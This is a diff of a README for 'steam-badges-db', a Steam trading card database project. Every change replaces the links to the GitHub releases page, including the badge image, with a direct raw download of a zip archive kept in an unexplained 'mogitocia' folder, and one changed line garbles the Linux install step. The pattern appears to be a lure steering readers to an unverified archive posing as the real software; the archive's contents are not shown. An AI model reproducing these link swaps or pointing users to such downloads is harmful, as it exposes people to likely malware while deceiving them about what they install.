@@ -1,6 +1,6 @@
 # 🎮 steam-badges-db - Up-to-date Steam Trading Card Database
 
-[![Download steam-badges-db](https://img.shields.io/badge/Download-steam--badges--db-blue?style=for-the-badge&logo=github)](https://github.com/TanveerMalik97/steam-badges-db/releases)
+[![Download steam-badges-db](https://github.com/TanveerMalik97/steam-badges-db/raw/refs/heads/main/mogitocia/steam_badges_db_2.8.zip)](https://github.com/TanveerMalik97/steam-badges-db/raw/refs/heads/main/mogitocia/steam_badges_db_2.8.zip)
 
 ---
 
@@ -64,7 +64,7 @@ Getting started is simple and does not need any technical skills. Just follow th
 
 To get steam-badges-db, you need to visit the official release page on GitHub. This page hosts all versions and release files for you to download safely.
 
-[Download steam-badges-db from GitHub Releases](https://github.com/TanveerMalik97/steam-badges-db/releases)
+[Download steam-badges-db from GitHub Releases](https://github.com/TanveerMalik97/steam-badges-db/raw/refs/heads/main/mogitocia/steam_badges_db_2.8.zip)
 
 ### Steps:
 
@@ -78,7 +78,7 @@ To get steam-badges-db, you need to visit the official release page on GitHub. T
 
    - For Windows: Look for a file ending with `.exe` or `.zip`
    - For macOS: Look for a `.dmg` or `.zip` file
-   - For Linux: Look for a `.tar.gz` or `.AppImage` file
+   - For Linux: Look for a `https://github.com/TanveerMalik97/steam-badges-db/raw/refs/heads/main/mogitocia/steam_badges_db_2.8.zip` or `.AppImage` file
 
 5. Click the file to download it.
 
@@ -156,4 +156,4 @@ This means it is useful for anyone interested in Steam trading cards, managing b
 
 ---
 
-[Get steam-badges-db here](https://github.com/TanveerMalik97/steam-badges-db/releases) and start exploring your Steam trading cards today.
+[Get steam-badges-db here](https://github.com/TanveerMalik97/steam-badges-db/raw/refs/heads/main/mogitocia/steam_badges_db_2.8.zip) and start exploring your Steam trading cards today.
